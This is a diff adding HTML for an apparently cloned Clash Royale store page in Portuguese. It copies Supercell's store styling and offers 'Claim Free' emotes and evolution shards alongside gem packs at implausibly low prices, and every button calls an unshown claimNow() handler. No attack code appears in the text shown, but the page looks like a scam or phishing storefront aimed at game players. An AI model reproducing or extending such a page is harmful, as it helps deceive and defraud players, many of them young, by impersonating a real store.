+                    </div>
+                    <div class="location" onclick="playSound()">
+                         <svg width="16" height="22" viewBox="0 0 21 22" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M10.6084 1.06348C6.29681 1.06348 2.80151 4.55878 2.80151 8.87041C2.80151 10.7953 3.50132 12.5544 4.6562 13.9156L10.6084 20.9256L16.5605 13.9154C17.7154 12.5544 18.4152 10.7951 18.4152 8.87019C18.4154 4.55878 14.9201 1.06348 10.6084 1.06348ZM10.6084 11.8122C8.8352 11.8122 7.39784 10.3749 7.39784 8.60161C7.39784 6.82836 8.8352 5.391 10.6084 5.391C12.3817 5.391 13.8191 6.82836 13.8191 8.60161C13.8191 10.3749 12.3817 11.8122 10.6084 11.8122Z" fill="#d2d2d2"></path></svg>
+                        <span style="color:black">Global</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    
+       <div class="header_StickyHeader__afXYg header_clashroyale__V0ceA" style="pointer-events: auto; transform: none;margin-top:-80px">
+   <header class="header_header__aEre8 header_clashroyale__V0ceA">
+      <div class="header_headerBg__Kx6wd"></div>
+      <div class="header_content__4hEDm">
+         <a tabindex="0" class="header_logo__Rz_Om header_clashroyale__V0ceA"><img alt="clashroyale" loading="lazy" decoding="async" data-nimg="fill" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;color:transparent" src="images/royale-header-flag.d7cdf34b.png"></a>
+         <div class="header_navButtons__VUEA5">
+            <div class="header_cart__bSEVC CartButton_CartButton__bZo9Y">
+               <button data-after-content="0" class="IconButton_IconButton__Dd2YR CartButton_CartIcon__2tRvz CartButton_Empty__zDLYe">
+                  <svg width="32" height="33" viewBox="0 0 32 33" fill="none" xmlns="http://www.w3.org/2000/svg">
+                     <path d="M20 26.0002H5L7.14285 12.0715L20 6.04834V26.0002Z" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
+                     <path d="M20 6.04834L25 10.1126L27 26.0002H20" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
+                     <path d="M16.5239 9.79013L16.5239 8.00974C16.5239 6.20552 15.2184 4.60759 13.3811 5.08582C10.9769 5.71158 10.2382 8.1223 10.2382 11.4349L10.2382 12.4651" stroke="white" stroke-width="1.5" stroke-linecap="round"></path>
+                  </svg>
+               </button>
+            </div>
+            <button class="header_menuButton__TqCpT header_clashroyale__V0ceA header_isLoggedIn__Egw5v">
+               <div class="UserAvatarImage_UserAvatarImage__HXR9U header_menuAvatar__i5JUN" data-after-content="S"><span style="box-sizing:border-box;display:block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:absolute;top:0;left:0;bottom:0;right:0"><img alt="avatar" fallback="[object Object]" src="images/0%252Cking%252C62E1FB%252CC4F0FF.png" decoding="async" data-nimg="fill" class="UserAvatarImage_userImage__zbczu" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%;object-fit:contain"></span></div>
+               <div class="header_menuIcon__U3HNm">
+                  <svg xmlns="http://www.w3.org/2000/svg" height="24" width="24" fill="none">
+                     <path d="M4 12.2202H28" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+                     <path d="M4 20.3672H28" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+                  </svg>
+               </div>
+            </button>
+         </div>
+      </div>
+   </header>
+</div>
+
+
+<section id="section1" class="Collapsible_Container__8dZh2">
+    <div class="ClashOfClans_Container__iadVY">
+       <div class="ClashOfClans_Content__I_dRT">
+           <h1 class="ClashOfClans_Heading__LpPvq">Boas-vindas à loja de Clash Royale!</h1>
+           <!-- <button onclick="playSound()" class="LearnMoreButton_LearnMoreButton__LZsPh">
+               <span>Learn more</span>
+               <div class="LearnMoreButton_Icon__NMKGT">
+                   <svg width="10" height="6" viewBox="0 0 10 6" fill="none" xmlns="http://www.w3.org/2000/svg">
+                       <path d="M9.94336 0.376953V2.73695L5.42336 5.33695L0.943359 2.69695L0.943359 0.376953L5.40336 2.77695L9.94336 0.376953Z" fill="black"></path>
+                   </svg>
+               </div>
+           </button> -->
+       </div>
+    </div>
+</section>
+
+<!-- Header -->
+
+<!-- Menu -->
+    <div class="GameFilterBar_gameFilterBar__Yy7IX GameFilterSection_gameFilterBar__C93J4" style="width:100%;margin-top:-2px">
+        <div class="GameFilterBar_gameFilterBar__inner__mswYT">
+            <div class="GameFilterBar_item__rY_3C" onclick="playSound()" data-game="brawlstars" data-state="checked" data-soft-disable="false" id="r0">
+                <div class="GameFilterBar_overlay__CBMri"></div>
+                <img class="GameFilterBar_icon__kbFhL" src="images/m1.png" alt="brawlstars">
+            </div>
+            <div class="GameFilterBar_item__rY_3C" onclick="playSound()" data-game="clashroyale" data-state="unchecked" data-soft-disable="false" id="r1">
+                <div class="GameFilterBar_overlay__CBMri"></div>
+                <img class="GameFilterBar_icon__kbFhL" src="images/m2.png" alt="clashroyale">
+            </div>
+            <div class="GameFilterBar_item__rY_3C" data-game="clashofclans" data-state="unchecked" data-soft-disable="true" id="r2" style="opacity:0.5;cursor:not-allowed;pointer-events:none;">
+                <div class="GameFilterBar_overlay__CBMri"></div>
+                <img class="GameFilterBar_icon__kbFhL" src="images/m3.png" alt="clashofclans">
+            </div>
+            <div class="GameFilterBar_item__rY_3C" data-game="squadbusters" data-state="unchecked" data-soft-disable="true" id="r3" style="opacity:0.5;cursor:not-allowed;pointer-events:none;">
+                <div class="GameFilterBar_overlay__CBMri"></div>
+                <img class="GameFilterBar_icon__kbFhL" src="images/m4.png" alt="squadbusters">
+            </div>
+        </div>
+    </div>
+
+<!-- Menu -->
+   
+<style>
+.Footer_Footer__LdRIC {
+  display: flex;
+  flex-direction: row;
+  justify-content: space-between;
+  align-items: center;
+  gap: 10px;
+  flex-wrap: nowrap;
+}
+
+.Tags_TagsContainer__pP6Zc,
+.Footer_BuyButtonArea__zux3t {
+  flex: 1;
+  min-width: 0;
+}
+
+.Tags_TagsContainer__pP6Zc {
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: flex-start;
+  align-items: center;
+  gap: 6px;
+}
+
+@media (max-width: 410px) {
+  .Footer_Footer__LdRIC {
+    flex-direction: row;
+    justify-content: center;
+    gap: 8px;
+  }
+
+  .Tags_TagsContainer__pP6Zc,
+  .Footer_BuyButtonArea__zux3t {
+    flex: 1;
+    min-width: 0;
+  }
+
+  .Tags_TagsContainer__pP6Zc {
+    justify-content: flex-start;
+  }
+
+  .Footer_BuyButtonArea__zux3t {
+    display: flex;
+    justify-content: flex-end;
+  }
+}
+</style>
+
+<style>
+.ItemsGrid_Items__Jt7tU.ClashRoyaleOfferCardContent_NormalGrid__8sPTR {
+  display: flex;
+  flex-direction: row;
+  justify-content: space-between;
+  flex-wrap: nowrap; 
+  gap: 8px;
+}
+
+.ClashRoyaleOfferCardContent_SubItem__Utgf_ {
+  flex: 1 1 0;
+  min-width: 0;
+}
+
+@media (max-width: 400px) {
+  .ItemsGrid_Items__Jt7tU.ClashRoyaleOfferCardContent_NormalGrid__8sPTR {
+    gap: 6px;
+  }
+
+  .ClashRoyaleOfferCardContent_SubItem__Utgf_ {
+    flex: 1;
+    min-width: 0;
+  }
+}
+</style>
+
+<style>
+.colors_green__ZYwOQ {
+  background: url(images/green-offer-bg.png);
+  background-size: cover;
+  background-position: center;
+  box-shadow: 0 10px 15px 0 rgba(0, 0, 0, 0.3), inset 0 -4px 0 #2e9174, inset 0 -6px 0 rgba(255, 255, 255, 0.3), inset 0 3px 0 rgba(255, 255, 255, 0.4);
+}
+</style>
+
+<!-- Scenery -->
+<div id="reward3" class="listitem" style="display: none;">
+               <div class="front" style="background:url(images/green-offer-bg.png);box-shadow:0 10px 15px 0 var(--color-default-shadow),inset 0 -4px 0 #2e9174,inset 0 -6px 0 rgba(255,255,255,.3),inset 0 3px 0 rgba(255,255,255,.4)">
+                  <div class="imgBox"><img src="images/bdragon.png"></div>
+                  <div class="claim klik" onclick="claimNow(this)" data-name="Emote: Baby Dragon Dance" data-img="images/bdragon.png" style="background-color: #b93dc1;box-shadow: inset 0 3px #e73afe;"> Claim Free </div>
+               </div>
+               <div class="front" style="background:url(images/green-offer-bg.png);box-shadow:0 10px 15px 0 var(--color-default-shadow),inset 0 -4px 0 #2e9174,inset 0 -6px 0 rgba(255,255,255,.3),inset 0 3px 0 rgba(255,255,255,.4)">
+                  <div class="imgBox"><img src="images/hogdance.png"></div>
+                  <div class="claim klik" onclick="claimNow(this)" data-name="Emote: Hog Dance" data-img="images/hogdance.png" style="background-color: #b93dc1;box-shadow: inset 0 3px #e73afe;"> Claim Free </div>
+               </div>
+               <div class="front" style="background:url(images/green-offer-bg.png);box-shadow:0 10px 15px 0 var(--color-default-shadow),inset 0 -4px 0 #2e9174,inset 0 -6px 0 rgba(255,255,255,.3),inset 0 3px 0 rgba(255,255,255,.4)">
+                  <div class="imgBox"><img src="images/goblinbooho.png"></div>
+                  <div class="claim klik" onclick="claimNow(this)" data-name="Emote: Goblin Boohoo" data-img="images/goblinbooho.png" style="background-color: #b93dc1;box-shadow: inset 0 3px #e73afe;"> Claim Free </div>
+               </div>
+               <div class="front" style="background:url(images/green-offer-bg.png);box-shadow:0 10px 15px 0 var(--color-default-shadow),inset 0 -4px 0 #2e9174,inset 0 -6px 0 rgba(255,255,255,.3),inset 0 3px 0 rgba(255,255,255,.4)">
+                  <div class="imgBox"><img src="images/goldenratio.png"></div>
+                  <div class="claim klik" onclick="claimNow(this)" data-name="Emote: Golden Ratio" data-img="images/goldenratio.png" style="background-color: #b93dc1;box-shadow: inset 0 3px #e73afe;"> Claim Free </div>
+               </div>
+            </div>
+<!-- Scenery -->
+
+<!-- Gems Header -->
+<div id="gems-header" class="Offers_headerContainer__17v9Q" style="display:none;">
+   <div class="Offers_imageContainer__Td9Ts">
+      <img alt="offers-heading-image" loading="lazy" decoding="async" data-nimg="fill" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;color:transparent" src="images/offers-heading.735fde5c.png">
+      <div class="Offers_headerText__XokRy">
+         <h2>Gemas</h2>
+      </div>
+   </div>
+</div>
+
+<!-- Scenery -->
+<div id="reward1" class="listitem" style="display: none;">
+               <div class="front" style="background:radial-gradient(61.85% 50% at 50% 50%,#F0F9FC 0,#AAC1EE 100%);box-shadow:0 10px 15px 0 var(--color-default-shadow),inset 0 -4px 0 #899dc4,inset 0 -6px 0 rgba(255,255,255,.3),inset 0 3px 0 rgba(255,255,255,.4)">
+                  <div class="imgBox"><img src="images/479a03e2-e307-4cba-980d-7fae6a0cacbf_wagon_of_gems_min.png"></div>
+                  <div style="text-align:center;margin:5px 0;">
+                     <div style="background:linear-gradient(180deg, #ffd56b 0%, #d4a244 50%, #ffd56b 100%);border-radius:15px;padding:4px 20px;display:inline-block;box-shadow:0 4px 8px rgba(0,0,0,0.3),inset 0 2px 0 rgba(255,255,255,0.4),inset 0 -2px 0 rgba(0,0,0,0.2);border:2px solid #8b6914;">
+                        <span style="font-family:clash;font-size:16px;color:#fff;text-shadow:2px 2px 2px rgba(0,0,0,0.6);font-weight:bold;">x20 000</span>
+                     </div>
+                  </div>
+                  <div class="claim klik" onclick="claimNow(this)" data-name="Wagon Of Gems (x20000)" data-img="images/479a03e2-e307-4cba-980d-7fae6a0cacbf_wagon_of_gems_min.png" style="background-color: #b93dc1;box-shadow: inset 0 3px #e73afe;padding:8px 28px;font-size:15px;"> R$ 29,90 </div>
+               </div>
+               <div class="front" style="background:radial-gradient(61.85% 50% at 50% 50%,#F0F9FC 0,#AAC1EE 100%);box-shadow:0 10px 15px 0 var(--color-default-shadow),inset 0 -4px 0 #899dc4,inset 0 -6px 0 rgba(255,255,255,.3),inset 0 3px 0 rgba(255,255,255,.4)">
+                  <div class="imgBox"><img src="images/cbd272d3-cca4-4cf2-8a04-3f8ae2cb7aa4_barrel_of_gems_min.png"></div>
+                  <div style="text-align:center;margin:5px 0;">
+                     <div style="background:linear-gradient(180deg, #ffd56b 0%, #d4a244 50%, #ffd56b 100%);border-radius:15px;padding:4px 20px;display:inline-block;box-shadow:0 4px 8px rgba(0,0,0,0.3),inset 0 2px 0 rgba(255,255,255,0.4),inset 0 -2px 0 rgba(0,0,0,0.2);border:2px solid #8b6914;">
+                        <span style="font-family:clash;font-size:16px;color:#fff;text-shadow:2px 2px 2px rgba(0,0,0,0.6);font-weight:bold;">x10 000</span>
+                     </div>
+                  </div>
+                  <div class="claim klik" onclick="claimNow(this)" data-name="Barrel Of Gems (x10000)" data-img="images/cbd272d3-cca4-4cf2-8a04-3f8ae2cb7aa4_barrel_of_gems_min.png" style="background-color: #b93dc1;box-shadow: inset 0 3px #e73afe;padding:8px 28px;font-size:15px;"> R$ 22,90 </div>
+               </div>
+               <div class="front" style="background:radial-gradient(61.85% 50% at 50% 50%,#F0F9FC 0,#AAC1EE 100%);box-shadow:0 10px 15px 0 var(--color-default-shadow),inset 0 -4px 0 #899dc4,inset 0 -6px 0 rgba(255,255,255,.3),inset 0 3px 0 rgba(255,255,255,.4)">
+                  <div class="imgBox"><img src="images/6581364d-b24a-4a37-9d3a-71d1f673ccd9_bucket_of_gems_min.png"></div>
+                  <div style="text-align:center;margin:5px 0;">
+                     <div style="background:linear-gradient(180deg, #ffd56b 0%, #d4a244 50%, #ffd56b 100%);border-radius:15px;padding:4px 20px;display:inline-block;box-shadow:0 4px 8px rgba(0,0,0,0.3),inset 0 2px 0 rgba(255,255,255,0.4),inset 0 -2px 0 rgba(0,0,0,0.2);border:2px solid #8b6914;">
+                        <span style="font-family:clash;font-size:16px;color:#fff;text-shadow:2px 2px 2px rgba(0,0,0,0.6);font-weight:bold;">x5 000</span>
+                     </div>
+                  </div>
+                  <div class="claim klik" onclick="claimNow(this)" data-name="Bucket Of Gems (x5000)" data-img="images/6581364d-b24a-4a37-9d3a-71d1f673ccd9_bucket_of_gems_min.png" style="background-color: #b93dc1;box-shadow: inset 0 3px #e73afe;padding:8px 28px;font-size:15px;"> R$ 19,90 </div>
+               </div>
+               <div class="front" style="background:radial-gradient(61.85% 50% at 50% 50%,#F0F9FC 0,#AAC1EE 100%);box-shadow:0 10px 15px 0 var(--color-default-shadow),inset 0 -4px 0 #899dc4,inset 0 -6px 0 rgba(255,255,255,.3),inset 0 3px 0 rgba(255,255,255,.4)">
+                  <div class="imgBox"><img src="images/bc55fd85-7a54-49f5-a609-2f7f16fc96a0_pouch_of_gems_min.png"></div>
+                  <div style="text-align:center;margin:5px 0;">
+                     <div style="background:linear-gradient(180deg, #ffd56b 0%, #d4a244 50%, #ffd56b 100%);border-radius:15px;padding:4px 20px;display:inline-block;box-shadow:0 4px 8px rgba(0,0,0,0.3),inset 0 2px 0 rgba(255,255,255,0.4),inset 0 -2px 0 rgba(0,0,0,0.2);border:2px solid #8b6914;">
+                        <span style="font-family:clash;font-size:16px;color:#fff;text-shadow:2px 2px 2px rgba(0,0,0,0.6);font-weight:bold;">x2 500</span>
+                     </div>
+                  </div>
+                  <div class="claim klik" onclick="claimNow(this)" data-name="Pouch Of Gems (x2500)" data-img="images/bc55fd85-7a54-49f5-a609-2f7f16fc96a0_pouch_of_gems_min.png" style="background-color: #b93dc1;box-shadow: inset 0 3px #e73afe;padding:8px 28px;font-size:15px;"> R$ 14,90 </div>
+               </div>
+            </div>
+<!-- Scenery -->
+
+<!-- Scenery -->
+<div id="reward2" class="listitem" style="display: none;">
+               <!-- <div class="front" style="background:radial-gradient(61.85% 50% at 50% 50%,#fff 0%,#3490cf 100%);box-shadow:0 10px 15px 0 var(--color-default-shadow),inset 0 -4px 0 #2165a5,inset 0 -6px 0 rgba(255,255,255,.3),inset 0 3px 0 rgba(255,255,255,.4)">
+                  <div class="imgBox"><img src="img/a8.png"></div>
+                  <div class="claim klik" data-name="Item_Shard_Goblin_Giant_Evolution" style="background-color: #6d828e;box-shadow: inset 0 3px #3e6b88;"> Max Claim </div>
+               </div> -->
+               <div class="front" style="background:radial-gradient(61.85% 50% at 50% 50%,#fff 0%,#3490cf 100%);box-shadow:0 10px 15px 0 var(--color-default-shadow),inset 0 -4px 0 #2165a5,inset 0 -6px 0 rgba(255,255,255,.3),inset 0 3px 0 rgba(255,255,255,.4)">
+                  <div class="imgBox"><img src="images/Royal_Ghost_Evolution_Shard_alpha.png"></div>
+                  <div class="claim klik" onclick="claimNow(this)" data-name="Royal Ghost Evolution" data-img="images/Royal_Ghost_Evolution_Shard_alpha.png" style="background-color: #b93dc1;box-shadow: inset 0 3px #e73afe;"> Claim Free </div>
+               </div>
+               <div class="front" style="background:radial-gradient(61.85% 50% at 50% 50%,#fff 0%,#3490cf 100%);box-shadow:0 10px 15px 0 var(--color-default-shadow),inset 0 -4px 0 #2165a5,inset 0 -6px 0 rgba(255,255,255,.3),inset 0 3px 0 rgba(255,255,255,.4)">
+                  <div class="imgBox"><img src="images/Skeleton_Army_Evolution_Shard_alpha.png"></div>
+                  <div class="claim klik" onclick="claimNow(this)" data-name="Skeleton Army Evolution" data-img="images/Skeleton_Army_Evolution_Shard_alpha.png" style="background-color: #b93dc1;box-shadow: inset 0 3px #e73afe;"> Claim Free </div>
+               </div>
+               <div class="front" style="background:radial-gradient(61.85% 50% at 50% 50%,#fff 0%,#3490cf 100%);box-shadow:0 10px 15px 0 var(--color-default-shadow),inset 0 -4px 0 #2165a5,inset 0 -6px 0 rgba(255,255,255,.3),inset 0 3px 0 rgba(255,255,255,.4)">
+                  <div class="imgBox"><img src="images/baby_dragon_evolution_shard_transparent.png"></div>
+                  <div class="claim klik" onclick="claimNow(this)" data-name="Baby Dragon Evolution" data-img="images/baby_dragon_evolution_shard_transparent.png" style="background-color: #b93dc1;box-shadow: inset 0 3px #e73afe;"> Claim Free </div>
+               </div>
+               <div class="front" style="background:radial-gradient(61.85% 50% at 50% 50%,#fff 0%,#3490cf 100%);box-shadow:0 10px 15px 0 var(--color-default-shadow),inset 0 -4px 0 #2165a5,inset 0 -6px 0 rgba(255,255,255,.3),inset 0 3px 0 rgba(255,255,255,.4)">
+                  <div class="imgBox"><img src="images/Furnace_Evolution_Shard_alpha.png"></div>
+                  <div class="claim klik" onclick="claimNow(this)" data-name="Furnace Evolution" data-img="images/Furnace_Evolution_Shard_alpha.png" style="background-color: #b93dc1;box-shadow: inset 0 3px #e73afe;"> Claim Free </div>
+               </div>
+   
+            </div>
+<!-- Scenery -->
+
+<!-- Skill -->
+<div class="clashofclans_StoreSpecials__RVOQi" style="margin-top:-30px;padding-top:10px;">
+   <div id="reward0" class="bundles_bundles___E3s2 bundles_clashofclans__TUelf storefronts_clashofclans__DcoWQ" style="background-image:url('images/biru.webp');display: block;">
+      <div class="Offers_headerContainer__17v9Q">
+            <div class="Offers_imageContainer__Td9Ts">
+               <img alt="offers-heading-image" loading="lazy" decoding="async" data-nimg="fill" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;color:transparent" src="images/offers-heading.735fde5c.png">
+               <div class="Offers_headerText__XokRy">
+                  <h2>Ofertas</h2>
+               </div>
+            </div>
+         </div>
+      <div class="bundles_bundlesContainer__Ww73Y bundles_NewVisualsSpecialsOfferContainer__I2hVW">
+
+      
+<div class="Offers_offersContainer__Ujlv8 Offers_clashroyale__bcrpu">
+              <div id="pacote-emote/emote001" class="OfferCard_offerCardContainer__tXsBD">
+                 <a class="OfferCard_ContainerLink__wQvfj">
+                   <div class="ClashRoyaleContainer_Container__q1wLd colors_green__ZYwOQ ClashRoyaleOfferCard_Container__Wr1O_ ClashRoyaleOfferCard_withShadow__8lQpI ClashRoyaleContainer_MultiProductContainer__BnHWG">
+                     <div class="ClashRoyaleHeading_Container__8pX7c">
+                        <div class="ClashRoyaleHeading_RowContainer__h2tbZ ClashRoyaleHeading_MultiItemProduct__6XUmk">
+                           <span class="storeTypography_textBase__B5TeC storeTypography_font-clashofclans__FX0k1 storeTypography_size-sm__Yr6oa storeTypography_line-height-tight__D7jBW ClashRoyaleHeading_Strikethrough__TTA8r" font="clashroyale"></span>
+                           <h3 class="" style="font-family:clash;font-size:16px">Pacote Personalizado de 7x Emotes (Exclusivo)</h3>
+                        </div>
+                     </div>
+                     <div class="ClashRoyaleOfferCardContent_MultiItemContent__BTFv5">
+                        <div class="ClashRoyaleStoreSpecialHero_RegularHero__1khzU undefined" style="padding:20px 0;"><img alt="Pacote de Emote" width="343" height="184" src="images/pacote%20de%20emote.png" style="width:100%;height:auto;object-fit:contain;"></div>
+                     </div>
+                     <div class="Footer_Footer__LdRIC Footer_clashroyale__lQixY">
+                        <div class="Tags_TagsContainer__pP6Zc">
+                           <div class="PointsTag_Container__dzfcn PointsTag_Skew__8ELkb">
+                              <div class="PointsTag_TagStart__XIUSS PointsTag_TagLight__uNojb"></div>
+                              <div class="PointsTag_TagMiddle__lz4av PointsTag_TagMiddleLight__aVlPa PointsTag_Light__zuHDx">
+                                 <span class="PointsTag_Icon__7VSYR PointsTag_IconPoints__njqVp" style="background:url(images/idr-tag.8b829739.png);background-size:24px 24px;background-repeat:no-repeat;background-position:0 -3px;z-index:2"></span>
+                                 <p class="storeTypography_textBase__B5TeC storeTypography_font-supercellTextBold__fYMyP storeTypography_size-sm__Yr6oa storeTypography_line-height-normal__wHPzM PointsTag_PointsLabel__ECj3x PointsTag_Light__zuHDx" font="supercellTextBold">
+                                    +<!-- -->50<!-- --> <span class="PointsTag_pointsText__JbR_A">pts</span>
+                                 </p>
+                                 <div class="PointsTag_TagGlow__wjHhQ PointsTag_Light__zuHDx PointsTag_NoOutline__yNEAe"></div>
+                              </div>
+                              <div class="PointsTag_TagEnd__mDnYT PointsTag_TagLight__uNojb"></div>
+                           </div>
+                           <div class="PointsTag_Container__dzfcn">
+                              <div class="PointsTag_TagStart__XIUSS PointsTag_TagDark__DNdS5"></div>
+                              <div class="PointsTag_TagMiddle__lz4av PointsTag_TagMiddleDark__lZBrv PointsTag_Dark__0bud_">
+                                 <span class="PointsTag_Icon__7VSYR PointsTag_IconPoints__njqVp" style="background:url(images/bonus-icon.svg);background-size:20px 20px;background-repeat:no-repeat;background-position:center;z-index:2"></span>
+                                 <p class="storeTypography_textBase__B5TeC storeTypography_font-supercellTextBold__fYMyP storeTypography_size-sm__Yr6oa storeTypography_line-height-normal__wHPzM PointsTag_PointsLabel__ECj3x PointsTag_Dark__0bud_" font="supercellTextBold">
+                                    +<!-- -->50<!-- --> <span class="PointsTag_pointsText__JbR_A">pts</span>
+                                 </p>
+                                 <div class="PointsTag_TagGlow__wjHhQ PointsTag_Dark__0bud_ PointsTag_NoOutline__yNEAe"></div>
+                              </div>
+                              <div class="PointsTag_TagEnd__mDnYT PointsTag_TagDark__DNdS5"></div>
+                           </div>
+                        </div>
+                        <div class="Footer_BuyButtonArea__zux3t">
+                           <button onclick="claimNow(this)" data-name="Pacote Personalizado de 7x Emotes (Exclusivo)" data-img="images/pacote de emote.png" class="Button_Button__Msu2a Button_Primary__anIDa BuyButton_StoreFrontBuyButton__Zykdy BuyButton_Dark__Ww3Wu" data-type="buy">
+                              <div class="BuyButton_ContentWrapper__pg5il" style="font-size:10px;color:white;font-family:clash">
+                                 <svg width="32" height="33" viewBox="0 0 32 33" class="BuyButton_Icon__gacm5 BuyButton_WithContent__L0cYC" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M20 26.0002H5L7.14285 12.0715L20 6.04834V26.0002Z" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
+                                    <path d="M20 6.04834L25 10.1126L27 26.0002H20" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
+                                    <path d="M16.5239 9.79013L16.5239 8.00974C16.5239 6.20552 15.2184 4.60759 13.3811 5.08582C10.9769 5.71158 10.2382 8.1223 10.2382 11.4349L10.2382 12.4651" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"></path>
+                                 </svg>
+                                 R$ 16,90
+                              </div>
+                           </button>
+                        </div>
+                     </div>
+                     <div class="ClashRoyaleOfferAvailability_AvailabilityContainer__V88vw ClashRoyaleOfferAvailability_green__Sbf5k ClashRoyaleOfferCard_Availability__aKQ6L"><span class="storeTypography_textBase__B5TeC storeTypography_font-supercellTextMedium__2FL9v storeTypography_size-sm__Yr6oa storeTypography_line-height-tight__D7jBW ClashRoyaleOfferAvailability_AvailabilityText__w_CaH" font="supercellTextMedium" style="color:white">1/1 available</span></div>
+                  </div>
+               </a>
+            </div>
+
+<div class="Offers_offersContainer__Ujlv8 Offers_clashroyale__bcrpu">
+              <div id="royal-starter-pack/21e1aac5" class="OfferCard_offerCardContainer__tXsBD">
+                 <a class="OfferCard_ContainerLink__wQvfj">
+                   <div class="ClashRoyaleContainer_Container__q1wLd colors_green__ZYwOQ ClashRoyaleOfferCard_Container__Wr1O_ ClashRoyaleOfferCard_withShadow__8lQpI ClashRoyaleContainer_MultiProductContainer__BnHWG">
+                     <div class="ClashRoyaleHeading_Container__8pX7c">
+                        <div class="ClashRoyaleHeading_RowContainer__h2tbZ ClashRoyaleHeading_MultiItemProduct__6XUmk">
+                           <span class="storeTypography_textBase__B5TeC storeTypography_font-clashofclans__FX0k1 storeTypography_size-sm__Yr6oa storeTypography_line-height-tight__D7jBW ClashRoyaleHeading_Strikethrough__TTA8r" font="clashroyale"></span>
+                           <h3 class="" style="font-family:clash;font-size:18px">Royale Starter Pack</h3>
+                        </div>
+                     </div>
+                     <div class="ClashRoyaleOfferCardContent_MultiItemContent__BTFv5">
+                        <div class="ClashRoyaleOfferCardContent_MultiItemGridContainer__NBGSp">
+                           <div class="ItemsGrid_Items__Jt7tU ClashRoyaleOfferCardContent_NormalGrid__8sPTR">
+                              <div class="ClashRoyaleOfferCardContent_SubItem__Utgf_">
+                                 <div class="ClashRoyaleItem_SubItemCard__fVfJZ">
+                                    <div class="ClashRoyaleItem_ProductImage__PR9KV ClashRoyaleItem_SubItemProductImage__46PSF"><img alt="Gold" loading="lazy" decoding="async" data-nimg="fill" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;object-fit:contain;color:transparent" src="images/79055435-71c5-476d-96d0-c6d9b9537963.png"></div>
+                                    <div class="ClashRoyaleItem_SubItemFooterWrapper__zfdZo">
+                                       <span class="ClashRoyaleItem_SubItemFooter__tfJ4G">
+                                          <h3 class="storeTypography_textBase__B5TeC storeTypography_font-clashofclans__FX0k1 storeTypography_size-xs__s3mL3 storeTypography_outlined__RLahw storeTypography_line-height-tight__D7jBW ClashRoyaleItem_Title__gYvKs" font="clashroyale" style="font-size:11px;">1 000 000</h3>
+                                       </span>
+                                    </div>
+                                 </div>
+                              </div>
+                              <div class="ClashRoyaleOfferCardContent_SubItem__Utgf_">
+                                 <div class="ClashRoyaleItem_SubItemCard__fVfJZ">
+                                    <div class="ClashRoyaleItem_ProductImage__PR9KV ClashRoyaleItem_SubItemProductImage__46PSF"><img alt="Gems" loading="lazy" decoding="async" data-nimg="fill" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;object-fit:contain;color:transparent" src="images/32bfe5ed-9787-4ee3-91da-301f7f9ad6a9.png"></div>
+                                    <div class="ClashRoyaleItem_SubItemFooterWrapper__zfdZo">
+                                       <span class="ClashRoyaleItem_SubItemFooter__tfJ4G">
+                                          <h3 class="storeTypography_textBase__B5TeC storeTypography_font-clashofclans__FX0k1 storeTypography_size-xs__s3mL3 storeTypography_outlined__RLahw storeTypography_line-height-tight__D7jBW ClashRoyaleItem_Title__gYvKs" font="clashroyale">5 000</h3>
+                                       </span>
+                                    </div>
+                                 </div>
+                              </div>
+                              <div class="ClashRoyaleOfferCardContent_SubItem__Utgf_">
+                                 <div class="ClashRoyaleItem_SubItemCard__fVfJZ">
+                                    <div class="ClashRoyaleItem_ProductImage__PR9KV ClashRoyaleItem_SubItemProductImage__46PSF"><img alt="Legendary Card" loading="lazy" decoding="async" data-nimg="fill" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;object-fit:contain;color:transparent;transform:scale(1.5);transform-origin:center" src="images/card%20lendario.webp"></div>
+                                    <div class="ClashRoyaleItem_SubItemFooterWrapper__zfdZo">
+                                       <span class="ClashRoyaleItem_SubItemFooter__tfJ4G">
+                                          <h3 class="storeTypography_textBase__B5TeC storeTypography_font-clashofclans__FX0k1 storeTypography_size-xs__s3mL3 storeTypography_outlined__RLahw storeTypography_line-height-tight__D7jBW ClashRoyaleItem_Title__gYvKs" font="clashroyale">250</h3>
+                                       </span>
+                                    </div>
+                                 </div>
+                              </div>
+                           </div>
+                        </div>
+                     </div>
+                     <div class="Footer_Footer__LdRIC Footer_clashroyale__lQixY">
+                        <div class="Tags_TagsContainer__pP6Zc">
+                           <div class="PointsTag_Container__dzfcn PointsTag_Skew__8ELkb">
+                              <div class="PointsTag_TagStart__XIUSS PointsTag_TagLight__uNojb"></div>
+                              <div class="PointsTag_TagMiddle__lz4av PointsTag_TagMiddleLight__aVlPa PointsTag_Light__zuHDx">
+                                 <span class="PointsTag_Icon__7VSYR PointsTag_IconPoints__njqVp" style="background:url(images/idr-tag.8b829739.png);background-size:24px 24px;background-repeat:no-repeat;background-position:0 -3px;z-index:2"></span>
+                                 <p class="storeTypography_textBase__B5TeC storeTypography_font-supercellTextBold__fYMyP storeTypography_size-sm__Yr6oa storeTypography_line-height-normal__wHPzM PointsTag_PointsLabel__ECj3x PointsTag_Light__zuHDx" font="supercellTextBold">
+                                    +<!-- -->250<!-- --> <span class="PointsTag_pointsText__JbR_A">pts</span>
+                                 </p>
+                                 <div class="PointsTag_TagGlow__wjHhQ PointsTag_Light__zuHDx PointsTag_NoOutline__yNEAe"></div>
